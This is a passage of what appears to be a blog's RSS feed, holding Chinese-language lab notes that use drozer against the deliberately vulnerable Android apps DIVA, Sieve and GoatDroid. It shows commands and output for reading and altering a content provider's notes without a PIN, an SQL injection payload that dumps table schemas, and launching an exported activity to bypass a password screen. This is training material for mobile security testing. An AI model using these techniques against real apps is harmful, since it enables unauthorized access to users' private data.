&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> broadcast receivers exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">1&lt;/span> content providers exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> services exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> is debuggable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>package name: jakhar.aseem.diva
attack surface: activities exported/content providers exported/is debuggable&lt;/p></description></item><item><title>Test DIVA - content provider exported - DB Based</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/</guid><description>&lt;h1 id="test-diva---content-provider-exported---db-based">
 Test DIVA - content provider exported - DB Based
 &lt;a class="anchor" href="#test-diva---content-provider-exported---db-based">#&lt;/a>
&lt;/h1>
&lt;p>這一題是第&lt;code>11. Access Control Issues - Part 3&lt;/code>，用意是要我們不需要PIN code就可以access儲存起來的notes&lt;/p>
&lt;ol>
&lt;li>起手式
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.info -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: jakhar.aseem.diva.provider.notesprovider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: jakhar.aseem.diva.NotesProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.finduris -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For sure accessible content URIs:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上測試結果可以知道&lt;code>jakhar.aseem.diva.NotesProvider&lt;/code>的狀況，以及對應的URI為何&lt;/li>
&lt;li>逆向
從&lt;code>NotesProvider&lt;/code>這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request&lt;/li>
&lt;li>query/insert/update/delete/sqli
&lt;ul>
&lt;li>query
我們達到了一開始題目的要求，只需要直接query就好了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Exercise
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Alternate days running
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Expense
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Spent too much on home theater
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Weekend
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note b333333333333r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title holiday
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Either Goa or Amsterdam
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title home
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title office
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>insert
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id &lt;span style="color:#ae81ff">7&lt;/span> --string title pwn1 --string note pwnpwn1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">7&lt;/span> | pwn1 | pwnpwn1 |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>update
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selectio
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n-args &lt;span style="color:#ae81ff">7&lt;/span> --string title pwn2 --string note pwnpwn2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">7&lt;/span> | pwn2 | pwnpwn2 |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>delete
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-args &lt;span style="color:#ae81ff">7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sqli
測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exception occured: unrecognized token: &lt;span style="color:#e6db74">&amp;#34;&amp;#39;) ORDER BY title&amp;#34;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>code &lt;span style="color:#ae81ff">1&lt;/span> SQLITE_ERROR&lt;span style="color:#f92672">)&lt;/span>: , &lt;span style="color:#66d9ef">while&lt;/span> compiling: SELECT * FROM notes WHERE &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;) ORDER BY title
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection &amp;#34;* FROM SQLITE_MASTER WHERE type=&amp;#39;&lt;/span>table&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;--&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Attempting to run shell module
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| type | name | tbl_name | rootpage | sql |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) |
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>也可以透過drozer自動找可能的點
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.injection -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Projection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Selection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.sqltables -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqlite_sequence
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://jakhar.aseem.diva.provider.notesprovider/notes:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqlite_sequence
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - activities exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/</guid><description>&lt;ul>
&lt;li>Drozer Seive - &lt;a href="https://labs.withsecure.com/tools/drozer#3.1">官網&lt;/a>, &lt;a href="https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/sieve.apk">Download&lt;/a>
&lt;blockquote>
&lt;p>Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h1 id="test-sieve---activities-exported">
 Test Sieve - activities exported
 &lt;a class="anchor" href="#test-sieve---activities-exported">#&lt;/a>
&lt;/h1>
&lt;p>參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞&lt;/p>
&lt;ol>
&lt;li>起手式-確認基本資訊
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.package.list -f Sieve # 確認該App的package name
Attempting to run shell module
com.mwr.example.sieve (Sieve)

dz&amp;gt; run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊
Attempting to run shell module
Package: com.mwr.example.sieve
 Application Label: Sieve
 Process Name: com.mwr.example.sieve
 Version: 1.0
 Data Directory: /data/user/0/com.mwr.example.sieve
 APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk
 UID: 10285
 GID: [3003]
 Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar]
 Shared User ID: null
 Uses Permissions:
 - android.permission.READ_EXTERNAL_STORAGE
 - android.permission.WRITE_EXTERNAL_STORAGE
 - android.permission.INTERNET
 - android.permission.POST_NOTIFICATIONS
 - android.permission.ACCESS_MEDIA_LOCATION
 - android.permission.READ_MEDIA_AUDIO
 - android.permission.READ_MEDIA_VIDEO
 - android.permission.READ_MEDIA_IMAGES
 Defines Permissions:
 - com.mwr.example.sieve.READ_KEYS
 - com.mwr.example.sieve.WRITE_KEYS

dz&amp;gt; run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示
...

dz&amp;gt; run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些
Attempting to run shell module
Attack Surface:
 3 activities exported
 0 broadcast receivers exported
 2 content providers exported
 2 services exported
 is debuggable
&lt;/code>&lt;/pre>看攻擊面的左邊就是該攻擊點有幾個&lt;/li>
&lt;li>activities exported
&lt;ol>
&lt;li>列出exported activities有哪些
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.activity.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.FileSelectActivity
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.MainLoginActivity
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.PWList
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>啟動activity
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass
![Screenshot_20240603-163856](&lt;a href="https://hackmd.io/_uploads/rkrr-ZsNA.png">https://hackmd.io/_uploads/rkrr-ZsNA.png&lt;/a> =200x)&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h1 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h1>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://blog.csdn.net/samlirongsheng/article/details/104926282">drozer之玩轉sieve&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>Test Sieve - broadcast receivers exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/</guid><description>&lt;h1 id="test-sieve---broadcast-receivers-exported">
 Test Sieve - broadcast receivers exported
 &lt;a class="anchor" href="#test-sieve---broadcast-receivers-exported">#&lt;/a>
&lt;/h1>
&lt;p>這個就不是用Sieve做示範，因為這個App沒有match的receiver&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.broadcast.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> No matching receivers.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以我就用之前安裝的goatdroid做示範&lt;/p>
&lt;ol>
&lt;li>檢查broadcast receiver
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: org.owasp.goatdroid.fourgoats
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>確認後就逆向看一下
在&lt;code>org.owasp.goatdroid.fourgoats.broadcastreceivers&lt;/code>中有SendSMSNowReceiver這個class，內容如下:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SendSMSNowReceiver&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> BroadcastReceiver {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Context context;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.BroadcastReceiver&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">onReceive&lt;/span>(Context arg0, Intent arg1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> arg0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SmsManager sms &lt;span style="color:#f92672">=&lt;/span> SmsManager.&lt;span style="color:#a6e22e">getDefault&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Bundle bundle &lt;span style="color:#f92672">=&lt;/span> arg1.&lt;span style="color:#a6e22e">getExtras&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sms.&lt;span style="color:#a6e22e">sendTextMessage&lt;/span>(bundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;phoneNumber&amp;#34;&lt;/span>), &lt;span style="color:#66d9ef">null&lt;/span>, bundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;message&amp;#34;&lt;/span>), &lt;span style="color:#66d9ef">null&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Utils.&lt;span style="color:#a6e22e">makeToast&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">context&lt;/span>, Constants.&lt;span style="color:#a6e22e">TEXT_MESSAGE_SENT&lt;/span>, 1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
